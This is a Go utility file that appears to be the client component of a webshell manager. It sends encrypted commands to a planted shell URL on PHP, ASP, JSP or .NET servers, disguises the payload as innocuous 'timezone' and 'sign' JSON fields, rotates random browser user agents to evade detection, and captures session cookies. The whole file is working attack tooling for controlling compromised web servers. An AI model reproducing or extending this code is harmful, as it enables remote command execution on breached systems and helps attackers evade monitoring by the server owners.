package util

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

// GenerateRandomUserAgent returns a randomly selected user agent string
func GenerateRandomUserAgent() string {
	// Seed the random number generator
	rand := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Common browser versions
	chromeVersions := []string{"96.0.4664.110", "95.0.4638.69", "94.0.4606.81", "93.0.4577.63", "92.0.4515.159"}
	firefoxVersions := []string{"95.0", "94.0.2", "93.0.1", "92.0", "91.0.2"}
	safariVersions := []string{"15.1", "15.0", "14.1.2", "14.0", "13.1.2"}

	// OS platforms
	windowsPlatforms := []string{"Windows NT 10.0; Win64; x64", "Windows NT 6.3; Win64; x64", "Windows NT 6.1; Win64; x64"}
	macPlatforms := []string{"Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 10_14_6", "Macintosh; Intel Mac OS X 10_13_6"}
	linuxPlatforms := []string{"X11; Linux x86_64", "X11; Ubuntu; Linux x86_64", "X11; Fedora; Linux x86_64"}

	// Randomly select browser type and build user agent
	browserType := rand.Intn(3)

	switch browserType {
	case 0: // Chrome
		platforms := [][]string{windowsPlatforms, macPlatforms, linuxPlatforms}
		platform := platforms[rand.Intn(3)][rand.Intn(len(platforms[rand.Intn(3)]))]
		version := chromeVersions[rand.Intn(len(chromeVersions))]
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", platform, version)
	case 1: // Firefox
		platforms := [][]string{windowsPlatforms, macPlatforms, linuxPlatforms}
		platform := platforms[rand.Intn(3)][rand.Intn(len(platforms[rand.Intn(3)]))]
		version := firefoxVersions[rand.Intn(len(firefoxVersions))]
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", platform, version, version)
	case 2: // Safari
		platform := macPlatforms[rand.Intn(len(macPlatforms))]
		version := safariVersions[rand.Intn(len(safariVersions))]
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", platform, version)
	}
	// Fallback
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

func PostRequest(shellURL string, password string, code string, session string, args ...any) (string, error) {
	// Directly construct JSON payload
	jsonStr := fmt.Sprintf(`{"timezone":%s,"sign":"%s"}`, password, code)

	// Create request
	req, err := http.NewRequest("POST", shellURL, bytes.NewBufferString(jsonStr))
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("User-Agent", GenerateRandomUserAgent())
	req.Header.Set("Content-Type", "application/json")
	if session != "" {
		// 因为go不支持可选参数，利用可变参数传入shell类型
		for _, arg := range args {
			switch arg {
			case "php":
				req.Header.Add("Cookie", "PHPSESSID="+session)
			case "asp":
				req.Header.Add("Cookie", "ASPSESSIONID="+session)
			case "java":
				req.Header.Add("Cookie", "JSESSIONID="+session)
			case "net":
				req.Header.Add("Cookie", "ASP.NET_SessionId="+session)
			}
		}
	}
	// Send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to execute command: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	return string(body), nil
}

func PostRequestWithoutSession(shellURL string, password string, code string) (string, error) {
	// Directly construct JSON payload
	jsonStr := fmt.Sprintf(`{"timezone":%s,"sign":"%s"}`, password, code)

	// Create request
	req, err := http.NewRequest("POST", shellURL, bytes.NewBufferString(jsonStr))
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("User-Agent", GenerateRandomUserAgent())
	req.Header.Set("Content-Type", "application/json")

	// Send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to execute command: %v", err)
	}
	defer resp.Body.Close()

	// Extract PHPSESSID from cookies Todo 增加其他类型的session
	for _, cookie := range resp.Cookies() {
		switch cookie.Name {
		case "PHPSESSID": // PHP session
			return cookie.Value, nil
		case "JSESSIONID": // JSP/Java session
			return cookie.Value, nil
		case "ASP.NET_SessionId": // ASP.NET session
			return cookie.Value, nil
		case "ASPSESSIONID": // Classic ASP session
			return cookie.Value, nil
		}
	}

	return "", nil
}

func HookPost(url, password, code, Sessions, shellType string) (string, error) {

	// Convert password to int (assuming it represents a timestamp)
	var timestampValue int
	if _, err := fmt.Sscanf(password, "%d", &timestampValue); err != nil {
		return "", fmt.Errorf("password must be a valid integer: %v", err)
	}
	rand := rand.New(rand.NewSource(time.Now().UnixNano()))
	dynamicPassword := strconv.Itoa(timestampValue + rand.Intn(2592000)) // 动态密钥

	// 加密code发送请求
	enCode := Encrypt(code, dynamicPassword) // 这里对code的处理底层仍然是字节，不会导致丢失问题
	enResult, err := PostRequest(url, dynamicPassword, enCode, Sessions, shellType)
	if err != nil {
		return "", err
	}

	// 解密code
	res := Decrypt(enResult, dynamicPassword)
	return res, nil
}
